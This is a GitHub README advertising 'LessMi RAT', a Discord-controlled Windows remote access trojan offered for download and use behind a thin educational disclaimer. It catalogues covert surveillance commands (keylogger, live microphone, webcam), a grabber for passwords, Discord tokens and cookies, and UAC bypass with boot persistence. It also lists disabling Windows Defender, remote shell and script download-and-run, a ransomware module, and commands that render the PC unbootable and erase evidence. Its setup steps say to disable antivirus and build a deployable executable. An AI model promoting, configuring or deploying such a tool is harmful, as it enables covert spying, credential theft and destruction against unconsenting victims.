<div align="center">

# LessMi RAT
# [Download](https://github.com/MateAGYT/LessMi/releases)

**An advanced, lightweight, open-source Windows RAT written in Python, controlled entirely through Discord — with a one-click panel, simple commands, and painless installation.**

<img src="https://files.catbox.moe/vuhaid.png" width="500" />

Join our Telegram community to stay tuned of the last changes and support us!<br><br>
[![Telegram Channel](https://img.shields.io/badge/lessmi--community-blue?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/lessmi_rat)

![Language](https://img.shields.io/badge/language-Python-3776AB?logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows&logoColor=white)
![Control](https://img.shields.io/badge/control-Discord-5865F2?logo=discord&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Commands](https://img.shields.io/badge/commands-100%2B-orange)
![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)

> **`MateAGYT/LessMi` is the ONLY official repository.** Don't install or run any other repo claiming to be us, or an "advanced/paid" version!

</div>

---

# 📑 Table of contents

- [1. About](#-about)
- [2. Disclaimer & license](#-disclaimer--license)
- [3. Features](#️-features)
  - [Surveillance & media](#-surveillance--media)
  - [Input & hardware control](#️-input--hardware-control)
  - [System & process control](#️-system--process-control)
  - [Filesystem](#-filesystem)
  - [Network & persistence](#-network--persistence)
  - [Trolling & pranks](#-trolling--pranks)
  - [Remote shell](#-remote-shell)
  - [Power & destructive](#-power--destructive)
  - [Extra / hidden commands](#-extra--hidden-commands)
- [4. Why LessMi?](#-why-lessmi)
- [5. Comparison with other RATs](#-comparison-with-other-rats)
- [6. Requirements](#-requirements)
- [7. Installation & compiling](#️-installation--compiling)
- [8. Troubleshooting & FAQ](#-troubleshooting--faq)
- [9. Roadmap](#-roadmap)
- [10. VirusTotal analysis](#-virustotal-analysis)
- [11. Credits](#-credits)
- [12. Contributing](#-contributing)

---

# 🧭 About

**LessMi** is a lightweight, fully-featured Remote Administration Tool for **Windows**, written in **Python** and commanded from a **Discord bot**. There is no ugly GUI client to keep open — your "control panel" is Discord itself, so you can manage one machine or a whole fleet of them from your phone, laptop, or a friend's PC.

It ships with an **interactive button panel**, so beginners can click instead of memorizing commands, while power users get the full command-line speed. Type `.help` at any time to get the full command list dumped straight into Discord.

LessMi is a modern, actively-maintained fork and spiritual successor to **PySilon** — a project that is now effectively **abandoned** — rebuilt with more features, more stability, and a proper install flow.

---

# ❗ Disclaimer & license

**a) Disclaimer.** Code and information in this repository are for **educational purposes only**. The creator is in **no way responsible** for any illegal or malicious activity carried out with this project. It is recommended for testing and legal activities. If you install it on someone else's computer, **ask them for permission** first.

**b) License.** This project is protected by the **MIT License**. See the [`LICENSE`](LICENSE) file for full details. You are free to use, modify, and redistribute it as long as the license and copyright notice are preserved.

---

# ⚙️ Features

> Commands use the `.` prefix. Run `.help` to list everything in-channel.

## 🎥 Surveillance & media

| Command | What it does |
|---|---|
| `.ss` | Screenshot **all** connected monitors. |
| `.screenrec <seconds>` | Record the screen for a chosen duration. |
| `.webcam` | Capture a picture from the webcam. |
| `.list-cams` / `.sel-cam <id>` | List cameras and pick the default one for `.webcam`. |
| `.list-mics` / `.sel-mic <id>` | List microphones and pick the default one for `.join`. |
| `.join` / `.disconnect` | Join the **live microphone feed** 24/7, or leave it. |
| `.record <seconds>` / `.mic-record <seconds>` | Instantly record the mic and send the clip. |
| `.show-screens` / `.screen-mode <mode>` | List monitors and change the screen layout. |
| `.list-speakers` / `.set-speaker <n>` | List audio outputs and switch the active speaker. |
| `.screensaver` | Start the screensaver. |

## 🖱️ Input & hardware control

| Command | What it does |
|---|---|
| `.block-input [seconds]` | Freeze keyboard + mouse for N seconds (or permanently). |
| `.unblock-input` | Release a permanent input block. |
| `.show-cursor` / `.hide-cursor` | Show or hide the cursor. |
| `.crazy-mouse` | Jiggle the mouse randomly for 2 seconds. |
| `.key <keys>` | Press keys — supports tokens like `[ENTER]`, `[SPACE]`, `[TAB]`, `[ESC]`. |
| `.alt-f4` | Send ALT+F4 to the active window. |
| `.monitors-on` / `.monitors-off` | Power the displays on or off. |
| `.rotate <0|90|180|270>` | Rotate the screen orientation. |
| `.volume <0-100>` | Set the system volume. |
| `.mute` | Mute system audio. |
| `.airplane-mode <on|off>` | Toggle airplane mode. |
| `.taskbar <hide|show>` | Hide or show the taskbar. |
| `.desktop-icons <hide|show>` | Hide or show desktop icons. |

## 🖥️ System & process control

| Command | What it does |
|---|---|
| `.tasklist` | List running processes. |
| `.taskkill <process>` | Kill a process by name. |
| `.kill-explorer` / `.start-explorer` | Kill/restart `explorer.exe` (black screen when stopped). |
| `.disable-taskmgr` / `.enable-taskmgr` | Toggle Task Manager. |
| `.disable-cmd` / `.enable-cmd` | Toggle Command Prompt. |
| `.disable-defender` / `.enable-defender` | Toggle Windows Defender. |
| `.disable-reagentc` / `.enable-reagentc` | Toggle ReAgentC (recovery). |
| `.set-critical` / `.unset-critical` | Mark the process critical (BSOD on terminate). |
| `.blacklist <proc>` / `.unblacklist <proc>` | Block a process from running. |
| `.enable-device <n>` / `.disable-device <n>` | Manage hardware devices. |
| `.idle-time` | Report how long the user has been idle. |
| `.set-date <date>` / `.set-hour <time>` | Change system date/time. |
| `.deactivate-windows` | Deactivate Windows. |
| `.clear-bin` | Empty the recycle bin. |
| `.services` | List running services. |
| `.installed` | List installed applications. |
| `.startup` | Show startup entries. |
| `.window-list` / `.focus <title>` / `.close-window <title>` | List, focus, or close windows by title. |
| `.clipboard` / `.set-clipboard <text>` | Read or set the clipboard. |
| `.beep` | Emit a system beep. |
| `.notepad [text]` | Open Notepad (optionally pre-filled). |

## 📁 Filesystem

| Command | What it does |
|---|---|
| `.ls` | List the current directory and files. |
| `.cd <path>` | Change directory. |
| `.tree` | Print the directory tree. |
| `.download <file>` | Upload a file from the target to Discord. |
| `.upload` | Push an attached file to the target. |
| `.grab-url <url> [dest]` | Download a file straight from a URL. |
| `.remove <file>` | Permanently delete a file or folder. |
| `.open <file>` | Open or execute a file. |
| `.mount-iso <file>` / `.unmount-iso <file>` | Mount or unmount an ISO. |

## 🌐 Network & persistence

| Command | What it does |
|---|---|
| `.ip-locate` | Geolocate the target by IP. |
| `.coords` | Fetch GPS / IP-based coordinates + a Maps link. |
| `.speedtest` | Run an internet speed test. |
| `.block-domain <d>` / `.unblock-domain <d>` | Block/unblock a domain. |
| `.block-website <url>` / `.unblock-website <url>` | Block/unblock a website. |
| `.set-dns <d1> <d2>` | Change the system DNS servers. |
| `.website <url>` | Open a URL in the default browser. |
| `.admin-check` | Report whether the RAT has admin rights. |
| `.ask-admin` | Request admin via a UAC prompt. |
| `.uac-bypass` | Attempt a UAC bypass for elevation. |
| *(startup)* | **Persistence + UAC bypass at boot**, out of the box. |

## 🎭 Trolling & pranks

| Command | What it does |
|---|---|
| `.msg <type> <title> <message>` | Show a customizable message box. |
| `.win-notify "<title>" <message>` | Fake Windows toast notification. |
| `.jumpscare` | Trigger a jumpscare. |
| `.display-glitch [graphic]` | Overlay a glitch graphic (shows help if none given). |
| `.play <file/url>` | Play audio from a file or URL. |
| `.tts <message>` | Speak your message out loud. |
| `.set-wallpaper <name_or_URL>` | Change the wallpaper. |
| `.minimize-all` | Minimize every window. |
| `.forkbomb` | Spawn processes until the PC chokes. |
| `.bsod` | Trigger a Blue Screen of Death. |

## ⌨️ Remote shell

| Command | What it does |
|---|---|
| `.cmd <command>` | Run a command through Command Prompt. |
| `.powershell <command>` | Run a command through PowerShell. |
| `.scriptloader <url>` | Download a `.ps1`/`.bat` script from a URL and run it. |
| `.key <keys>` | Type a string into the target. |

## 💥 Power & destructive

| Command | What it does |
|---|---|
| `.kill-pc` → `.confirm-kill` | Delete/rename the bootloader + key files → **unbootable** (cannot be undone). |
| `.implode` | Self-destruct, leaving no evidence. |
| `.exit` | Close the RAT until reboot or forced reopen. |
| `.update` | Push a newer compiled build via an attached file. |

## 🕵️ Extra / hidden commands

| Command | What it does |
|---|---|
| `.help` | Dump the full command reference (3 embeds). |
| `.keylogger-enable` / `.keylogger-disable` | Toggle the keylogger. |
| `.keylog` | Flush the keylog buffer to `#keys` immediately. |
| `.take all` | Grab **passwords, Discord tokens, browser history, cookies, and IP** in one shot. |
| `.leave-all` | Make the bot leave every server it's in. |
| `.clean` | Clear all channels. |

---

# 🏆 Why LessMi?

- **Free and open source** — MIT licensed, no paywall, no "pro tier".
- **Discord-native control** — manage machines from any device that runs Discord.
- **Button panel + commands** — friendly for beginners, fast for pros.
- **Batteries included** — persistence, UAC bypass, keylogger, **working grabber**, live mic, and self-destruct all built in.
- **Active** — maintained by a single dedicated author, unlike its abandoned ancestors.
- **Honest about lineage** — based on PySilon, rebuilt and extended.

---

# 📊 Comparison with other RATs

> `✅` full · `🟡` partial/plugin · `❌` none · `💀` abandoned · `⚠️` paid/limited

| Feature / RAT | **LessMi** | PySilon | QuasarRAT | AsyncRAT | Venom RAT | NanoCore | njRAT |
|---|---|---|---|---|---|---|---|
| Language | **Python** | Python | C# (.NET) | C# (.NET) | C# (.NET) | C# (.NET) | VB.NET |
| Control interface | **Discord** | Discord | Desktop GUI | Desktop GUI | Desktop GUI | Desktop GUI | Desktop GUI |
| License | **MIT** | MIT | MIT | MIT | Closed | Closed | Closed |
| Maintained | **✅ Active** | 💀 Abandoned | 🟡 | ✅ | ✅ | 🟡 | 💀 |
| Price | **Free** | Free | Free | Free | Free | ⚠️ | Free |
| Open source | **✅** | ✅ | ✅ | ✅ | 🟡 | ❌ | ❌ |
| One-click installer | **✅** | 🟡 | ❌ | ❌ | ❌ | ❌ | ❌ |
| Discord button panel | **✅** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Persistence at boot | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
| UAC bypass | **✅** | 🟡 | 🟡 | 🟡 | ✅ | 🟡 | 🟡 |
| Self-destruct | **✅** | ✅ | 🟡 | 🟡 | ✅ | 🟡 | ❌ |
| Live microphone | **✅** | ✅ | ❌ | ❌ | 🟡 | 🟡 | ❌ |
| Keylogger | **✅** | ✅ | 🟡 | ✅ | ✅ | ✅ | ✅ |
| Webcam | **✅** | ✅ | ✅ | 🟡 | ✅ | ✅ | ✅ |
| Multi-monitor screenshot | **✅** | ✅ | ✅ | 🟡 | ✅ | ✅ | 🟡 |
| File manager (download/upload) | **✅** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Remote shell | **✅** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Ransomware module | **✅** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Grabber (`take all`) | **✅** | ✅ | 🟡 | 🟡 | ✅ | ✅ | 🟡 |
| Trolling / pranks | **✅ Rich** | 🟡 | 🟡 | ❌ | 🟡 | 🟡 | 🟡 |
| Display control (rotate/mode) | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
| Clipboard access | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | ✅ | ✅ |
| Multiple PCs at once | **✅** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| No GUI to keep open | **✅** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Works over mobile Discord | **✅** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |

**Notes on the field:**

- **PySilon** — LessMi's direct ancestor. Great design, but development stalled; bugs linger and dependencies drift. LessMi exists precisely to fill that gap.
- **QuasarRAT / AsyncRAT / Venom / NanoCore / njRAT** — the classic **C# desktop-GUI** RATs. Powerful and mature, but you must keep the client open on your own machine, they're harder to use from a phone, and most need extra setup for persistence/UAC. NanoCore and Venom are closed-source; njRAT is long abandoned.
- **Why Discord wins** — with LessMi the "client" is a bot you already have open. No ports, no NAT punching, no separate controller app.

> ⚖️ *Comparison reflects general project characteristics at the time of writing; features change. Contributions to keep this table accurate are welcome.*

---

# 📋 Requirements

**On the compiling machine (yours):**

- Windows 10/11 (x64 recommended)
- [Python 3.10+](https://www.python.org/downloads/) — check **"Add Python to PATH"** during install
- A Discord bot token + channel (see setup below)
- A Discord account
- ~1 GB free disk for dependencies

**On the target machine:**

- Windows 10/11 (x64)
- Internet access
- No Python needed — the build is compiled to a standalone `.exe`

---

# 🛠️ Installation & compiling

1. **Download Python** from its official website, on a Windows system. Disable your antivirus first (it will scream at a fresh RAT), then run **`Compile-Windows.bat`**.
2. **Wait** while dependencies install, then enter your **bot details** when prompted.
3. **Click compile** and wait for the RAT to build.
4. **Done!** You now have your own LessMi RAT `.exe` ready to deploy.

### Setting up the Discord bot

1. Go to the [Discord Developer Portal](https://discord.com/developers/applications) → **New Application**.
2. Open the **Bot** tab → **Reset Token** → copy the token.
3. Enable **Privileged Gateway Intents** → turn on **Message Content Intent** (and *Server Members* if needed).
4. Invite the bot to your private server with the **bot** + **applications.commands** scopes.
5. Grab your **channel ID** (right-click channel → *Copy ID*, with Developer Mode on).
6. Paste the token and channel ID into the config when the compiler asks.

---

# 🔧 Troubleshooting & FAQ

**The bot doesn't respond.**
Check that **Message Content Intent** is enabled, the token is correct, and the bot can read/send in the target channel.

**Windows Defender / SmartScreen flags it.**
Normal for a fresh, unsigned RAT. Add an exclusion folder, or sign the binary. First-run may also need *"More info → Run anyway"*.

**`.webcam` / `.join` fails.**
Confirm a camera/mic exists and is selected via `.list-cams` / `.sel-cam` and `.list-mics` / `.sel-mic`. Some virtual devices misreport — pick a physical one.

**`.admin-check` says no admin.**
Run the build elevated, use `.ask-admin`, or try `.uac-bypass`.

**`.take all` opens consoles but sends nothing.**
Make sure the `resources/` scripts exist alongside the build, and that the target has `python` available for the sub-scripts. Output is written to fresh consoles on the target.

**Compile fails on dependencies.**
Update `pip` (`python -m pip install --upgrade pip`) and re-run the `.bat`. Ensure you're on a real Windows machine, not Wine.

**I executed `.monitors-off` and now it's black.**
That's intended — run `.monitors-on`. Same for `.kill-explorer` → `.start-explorer`.

**Is it cross-platform?**
Windows only. macOS/Linux are not supported (yet).

---

# 🗺️ Roadmap

- [ ] **Slash commands** — clone every prefix command as a slash command.
- [x] ~~Restore the **`take all` grabber** module.~~ ✅ **Done — fully available.**
- [ ] Even more commands (always).
- [ ] Signed release binaries to reduce AV false positives.
- [ ] Optional multi-bot sharding for large fleets.

---

# 🦠 VirusTotal analysis

<div align="center">
  <a href="https://www.virustotal.com/gui/file/ef97165978ade6288fac42bfe9df497c3cfbc583d83d31a90effb48cd9b98b99?nocache=1">
    <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/b/b7/VirusTotal_logo.svg/1280px-VirusTotal_logo.svg.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=thumbnail" alt="VirusTotal Analysis" height="80" />
  </a>
  <br />
  <sub>2/62 detections — <a href="https://www.virustotal.com/gui/file/ef97165978ade6288fac42bfe9df497c3cfbc583d83d31a90effb48cd9b98b99?nocache=1">See the full report in VirusTotal.</a></sub>
</div>
---

# 🙏 Credits

- **PySilon** — original concept and foundation that LessMi is based on. ❤️
- **`discord.py`** and the wider Python ecosystem.
- **You** — for using and testing it.

---

# 🤝 Contributing

1. Fork the repo.
2. Create a branch: `git checkout -b feature/my-thing`.
3. Commit your changes.
4. Open a Pull Request.

Bug reports, feature ideas, and improvements to this README (especially keeping the comparison table honest) are all welcome.

---

<div align="center">

**LessMi RAT** — made with 🐍 for Windows, controlled from Discord.
⭐ Star the repo if it helped you.

</div>
